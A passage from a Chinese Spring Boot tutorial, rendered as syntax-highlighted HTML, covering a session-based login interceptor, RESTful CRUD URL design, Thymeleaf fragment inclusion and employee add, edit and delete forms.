class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 登陆检查，</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginHandlerInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> {</span><br><span class="line">    <span class="comment">//目标方法执行之前</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> request.getSession().getAttribute(<span class="string">"loginUser"</span>);</span><br><span class="line">        <span class="keyword">if</span>(user == <span class="literal">null</span>){</span><br><span class="line">            <span class="comment">//未登陆，返回登陆页面</span></span><br><span class="line">            request.setAttribute(<span class="string">"msg"</span>,<span class="string">"没有权限请先登陆"</span>);</span><br><span class="line">            request.getRequestDispatcher(<span class="string">"/index.html"</span>).forward(request,response);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="comment">//已登陆，放行请求</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>注册拦截器</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//所有的WebMvcConfigurerAdapter组件都会一起起作用</span></span><br><span class="line">  <span class="meta">@Bean</span> <span class="comment">//将组件注册在容器</span></span><br><span class="line">  <span class="keyword">public</span> WebMvcConfigurerAdapter <span class="title function_">webMvcConfigurerAdapter</span><span class="params">()</span>{</span><br><span class="line">      <span class="type">WebMvcConfigurerAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebMvcConfigurerAdapter</span>() {</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> {</span><br><span class="line">              registry.addViewController(<span class="string">"/"</span>).setViewName(<span class="string">"login"</span>);</span><br><span class="line">              registry.addViewController(<span class="string">"/index.html"</span>).setViewName(<span class="string">"login"</span>);</span><br><span class="line">              registry.addViewController(<span class="string">"/main.html"</span>).setViewName(<span class="string">"dashboard"</span>);</span><br><span class="line">          }</span><br><span class="line"></span><br><span class="line">          <span class="comment">//注册拦截器</span></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> {</span><br><span class="line">              <span class="comment">//super.addInterceptors(registry);</span></span><br><span class="line">              <span class="comment">//静态资源；  *.css , *.js</span></span><br><span class="line">              <span class="comment">//SpringBoot已经做好了静态资源映射</span></span><br><span class="line">              registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">LoginHandlerInterceptor</span>()).addPathPatterns(<span class="string">"/**"</span>)</span><br><span class="line">                      .excludePathPatterns(<span class="string">"/index.html"</span>,<span class="string">"/"</span>,<span class="string">"/user/login"</span>);</span><br><span class="line">          }</span><br><span class="line">      };</span><br><span class="line">      <span class="keyword">return</span> adapter;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h3 id="5）、CRUD-员工列表"><a href="#5）、CRUD-员工列表" class="headerlink" title="5）、CRUD-员工列表"></a>5）、CRUD-员工列表</h3><p>实验要求：</p><p>1）、RestfulCRUD：CRUD满足Rest风格；</p><p>URI：  /资源名称/资源标识       HTTP请求方式区分对资源CRUD操作</p><table><thead><tr><th></th><th>普通CRUD（uri来区分操作）</th><th>RestfulCRUD</th></tr></thead><tbody><tr><td>查询</td><td>getEmp</td><td>emp—GET</td></tr><tr><td>添加</td><td>addEmp?xxx</td><td>emp—POST</td></tr><tr><td>修改</td><td>updateEmp?id=xxx&amp;xxx=xx</td><td>emp/{id}—PUT</td></tr><tr><td>删除</td><td>deleteEmp?id=1</td><td>emp/{id}—DELETE</td></tr></tbody></table><p>2）、实验的请求架构;</p><table><thead><tr><th>实验功能</th><th>请求URI</th><th>请求方式</th></tr></thead><tbody><tr><td>查询所有员工</td><td>emps</td><td>GET</td></tr><tr><td>查询某个员工(来到修改页面)</td><td>emp/1</td><td>GET</td></tr><tr><td>来到添加页面</td><td>emp</td><td>GET</td></tr><tr><td>添加员工</td><td>emp</td><td>POST</td></tr><tr><td>来到修改页面（查出员工进行信息回显）</td><td>emp/1</td><td>GET</td></tr><tr><td>修改员工</td><td>emp</td><td>PUT</td></tr><tr><td>删除员工</td><td>emp/1</td><td>DELETE</td></tr></tbody></table><p>3）、员工列表：</p><h4 id="thymeleaf公共页面元素抽取"><a href="#thymeleaf公共页面元素抽取" class="headerlink" title="thymeleaf公共页面元素抽取"></a>thymeleaf公共页面元素抽取</h4><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、抽取公共片段</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:fragment</span>=<span class="string">"copy"</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">2、引入公共片段</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:insert</span>=<span class="string">"~{footer :: copy}"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">~{templatename::selector}：模板名::选择器</span><br><span class="line">~{templatename::fragmentname}:模板名::片段名</span><br><span class="line"></span><br><span class="line">3、默认效果：</span><br><span class="line">insert的公共片段在div标签中</span><br><span class="line">如果使用th:insert等属性进行引入，可以不用写~{}：</span><br><span class="line">行内写法可以加上：[[~{}]];[(~{})]；</span><br></pre></td></tr></tbody></table></figure><p>三种引入公共片段的th属性：</p><p><strong>th:insert</strong>：将公共片段整个插入到声明引入的元素中</p><p><strong>th:replace</strong>：将声明引入的元素替换为公共片段</p><p><strong>th:include</strong>：将被引入的片段的内容包含进这个标签中</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">footer</span> <span class="attr">th:fragment</span>=<span class="string">"copy"</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">引入方式</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:insert</span>=<span class="string">"footer :: copy"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">"footer :: copy"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:include</span>=<span class="string">"footer :: copy"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">效果</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>引入片段的时候传入参数： </p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"col-md-2 d-none d-md-block bg-light sidebar"</span> <span class="attr">id</span>=<span class="string">"sidebar"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"sidebar-sticky"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav flex-column"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link active"</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">th:class</span>=<span class="string">"${activeUri=='main.html'?'nav-link active':'nav-link'}"</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">th:href</span>=<span class="string">"@{/main.html}"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"24"</span> <span class="attr">height</span>=<span class="string">"24"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 24 24"</span> <span class="attr">fill</span>=<span class="string">"none"</span> <span class="attr">stroke</span>=<span class="string">"currentColor"</span> <span class="attr">stroke-width</span>=<span class="string">"2"</span> <span class="attr">stroke-linecap</span>=<span class="string">"round"</span> <span class="attr">stroke-linejoin</span>=<span class="string">"round"</span> <span class="attr">class</span>=<span class="string">"feather feather-home"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">polyline</span> <span class="attr">points</span>=<span class="string">"9 22 9 12 15 12 15 22"</span>&gt;</span><span class="tag">&lt;/<span class="name">polyline</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">                    Dashboard <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>(current)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--引入侧边栏;传入参数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">"commons/bar::#sidebar(activeUri='emps')"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="6）、CRUD-员工添加"><a href="#6）、CRUD-员工添加" class="headerlink" title="6）、CRUD-员工添加"></a>6）、CRUD-员工添加</h3><p>添加页面</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>LastName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan@atguigu.com"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-check form-check-inline"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-check-input"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span>  <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"form-check-label"</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-check form-check-inline"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-check-input"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span>  <span class="attr">value</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"form-check-label"</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>department<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>5<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Birth<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>添加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>提交的数据格式不对：生日：日期；</p><p>2017-12-12；2017/12/12；2017.12.12；</p><p>日期的格式化；SpringMVC将页面提交的值需要转换为指定的类型;</p><p>2017-12-12—Date； 类型转换，格式化;</p><p>默认日期是按照/的方式；</p><h3 id="7）、CRUD-员工修改"><a href="#7）、CRUD-员工修改" class="headerlink" title="7）、CRUD-员工修改"></a>7）、CRUD-员工修改</h3><p>修改添加二合一表单</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--需要区分是员工修改还是添加；--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">"@{/emp}"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--发送put请求修改员工数据--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、SpringMVC中配置HiddenHttpMethodFilter;（SpringBoot自动配置好的）</span></span><br><span class="line"><span class="comment">2、页面创建一个post表单</span></span><br><span class="line"><span class="comment">3、创建一个input项，name="_method";值就是我们指定的请求方式</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"_method"</span> <span class="attr">value</span>=<span class="string">"put"</span> <span class="attr">th:if</span>=<span class="string">"${emp!=null}"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">th:if</span>=<span class="string">"${emp!=null}"</span> <span class="attr">th:value</span>=<span class="string">"${emp.id}"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>LastName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"lastName"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan"</span> <span class="attr">th:value</span>=<span class="string">"${emp!=null}?${emp.lastName}"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">type</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan@atguigu.com"</span> <span class="attr">th:value</span>=<span class="string">"${emp!=null}?${emp.email}"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-check form-check-inline"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-check-input"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">th:checked</span>=<span class="string">"${emp!=null}?${emp.gender==1}"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"form-check-label"</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-check form-check-inline"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-check-input"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"0"</span> <span class="attr">th:checked</span>=<span class="string">"${emp!=null}?${emp.gender==0}"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"form-check-label"</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>department<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--提交的是部门的id--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"department.id"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">th:selected</span>=<span class="string">"${emp!=null}?${dept.id == emp.department.id}"</span> <span class="attr">th:value</span>=<span class="string">"${dept.id}"</span> <span class="attr">th:each</span>=<span class="string">"dept:${depts}"</span> <span class="attr">th:text</span>=<span class="string">"${dept.departmentName}"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Birth<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"birth"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan"</span> <span class="attr">th:value</span>=<span class="string">"${emp!=null}?${#dates.format(emp.birth, 'yyyy-MM-dd HH:mm')}"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">th:text</span>=<span class="string">"${emp!=null}?'修改':'添加'"</span>&gt;</span>添加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="8）、CRUD-员工删除"><a href="#8）、CRUD-员工删除" class="headerlink" title="8）、CRUD-员工删除"></a>8）、CRUD-员工删除</h3><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">th:each</span>=<span class="string">"emp:${emps}"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"${emp.id}"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 